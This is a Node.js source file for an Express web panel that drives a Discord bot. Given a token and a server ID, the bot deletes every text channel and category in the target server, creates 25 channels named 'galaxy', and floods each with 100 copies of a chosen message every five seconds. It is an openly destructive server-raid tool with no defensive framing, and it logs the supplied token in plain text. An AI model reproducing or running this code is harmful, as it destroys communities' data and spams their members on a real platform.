const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

let shouldStop = false;
let logMessages = [];
let messageInterval;

const rateLimitInterval = 5000; // 5 seconds interval for rate limits

const log = (message) => {
    console.log(message);
    logMessages.push(message);
};

const deleteChannels = async (guild) => {
    try {
        const channels = await guild.channels.fetch();
        const deletePromises = channels.map(channel => {
            if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildCategory) {
                return channel.delete().catch(error => {
                    log(`Error deleting channel ${channel.name}: ${error}`);
                });
            }
        });
        await Promise.all(deletePromises);
        log('All existing channels and categories deleted.');
    } catch (error) {
        log(`Error fetching or deleting channels: ${error}`);
    }
};

const createChannels = async (guild) => {
    let createdChannels = [];
    const createChannelPromises = [];

    for (let i = 0; i < 25; i++) {
        createChannelPromises.push(
            guild.channels.create({
                name: `galaxy`,
                type: ChannelType.GuildText,
                reason: 'galaxy'
            }).then(channel => {
                createdChannels.push(channel);
            }).catch((error) => {
                log(`Error creating channel: ${error}`);
            })
        );
    }

    await Promise.all(createChannelPromises);
    log('All channels created.');
    return createdChannels;
};

const sendBatch = async (channels, message) => {
    const sendPromises = channels.flatMap(channel => {
        return Array.from({ length: 100 }, () => {
            return channel.send(message).catch(error => {
                log(`Error sending message to channel ${channel.name}: ${error}`);
            });
        });
    });
    await Promise.all(sendPromises);
};

const startSendingMessages = async (channels, message) => {
    log('Started sending messages.');
    while (!shouldStop) {
        await sendBatch(channels, message);
        log(`Sent ${100 * channels.length} messages.`);
        await new Promise(resolve => setTimeout(resolve, rateLimitInterval)); // Rate limit delay
    }
    log('Stopped sending messages.');
};

const stopSendingMessages = async () => {
    shouldStop = true;
    clearInterval(messageInterval);
    await new Promise(resolve => setTimeout(resolve, rateLimitInterval)); // Wait for any pending batches to finish
    client.destroy();
    log('Bot stopped and client destroyed.');
};

const startMenu = async (token, guildId, message) => {
    try {
        client.once('ready', async () => {
            log(`Logged in as ${client.user.tag}`);

            try {
                const guild = await client.guilds.fetch(guildId);
                if (!guild) {
                    log(`Guild with ID ${guildId} not found.`);
                    await client.destroy();
                    return;
                }

                // Delete all existing channels and categories
                await deleteChannels(guild);

                // Create channels and start sending messages
                const channels = await createChannels(guild);
                messageInterval = setInterval(() => {
                    if (!shouldStop) {
                        sendBatch(channels, message).then(() => {
                            log(`Sent ${100 * channels.length} messages.`);
                        }).catch(error => {
                            log(`Error sending messages: ${error}`);
                        });
                    }
                }, rateLimitInterval);
            } catch (error) {
                log(`Error fetching guild or creating channels: ${error}`);
            }
        });

        try {
            log(`Attempting to log in with token: ${token}`);
            await client.login(token);
        } catch (error) {
            log(`Error logging in: ${error}`);
        }
    } catch (error) {
        log(`Error: ${error}`);
    }
};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/start', async (req, res) => {
    const { token, guildId, message } = req.body;
    shouldStop = false;
    logMessages = [];
    await startMenu(token, guildId, message);
    res.json({ success: true });
});

app.post('/stop', async (req, res) => {
    await stopSendingMessages();
    res.json({ success: true });
});

app.get('/logs', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    let messageIndex = 0;
    const intervalId = setInterval(() => {
        while (messageIndex < logMessages.length) {
            res.write(`data: ${logMessages[messageIndex]}\n\n`);
            messageIndex++;
        }
    }, 1000);

    req.on('close', () => {
        clearInterval(intervalId);
        res.end();
    });
});

app.listen(port, () => {
    log(`Server running at http://localhost:${port}`);
});
